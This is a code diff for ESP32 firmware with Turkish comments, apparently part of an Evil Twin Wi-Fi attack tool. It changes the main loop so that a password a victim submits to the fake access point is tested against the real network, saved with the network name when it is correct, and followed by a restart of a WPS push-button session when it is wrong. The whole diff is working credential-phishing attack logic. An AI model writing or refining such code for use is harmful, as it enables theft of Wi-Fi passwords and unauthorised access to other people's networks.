@@ -58,14 +58,30 @@ void loop() {
   } else if (evil_twin_active) {
     // ── Evil Twin şifre testi (submit'ten sonra main loop devralır) ──────────
     if (et_test_pending && !et_result_ready) {
+      // WPS çalışıyorsa esp_wifi_connect() çağrısından ÖNCE temiz kapat.
+      // esp_wifi_connect() WPS'i aniden iptal eder ve WiFi stack'i yarım
+      // bırakılmış WPS durumunda tutar; sonrasında esp_wifi_wps_enable()
+      // STA henüz IDLE değilken çağrılınca sessizce başarısız olur.
+      // Önce kapatılırsa stack temiz IDLE'da kalır.
+      bool wps_was_running = et_wps_pbc_running;
+      if (wps_was_running) {
+        et_stop_wps_pbc();
+        delay(300);  // WPS kapanma geçiş süresi
+      }
+
       et_result_correct = evil_twin_test_password(et_tested_password);
       et_result_ready   = true;
       et_test_pending   = false;
       reapply_wifi_power();
+
       if (et_result_correct) {
         passwords_save(et_tested_ssid, et_tested_password);
         stop_evil_twin();
         led_on();
+      } else if (wps_was_running) {
+        // Şifre yanlış — WiFi stack tamamen IDLE'a dönmesi için bekle
+        delay(800);
+        et_start_wps_pbc();
       }
     }
     evil_twin_loop();
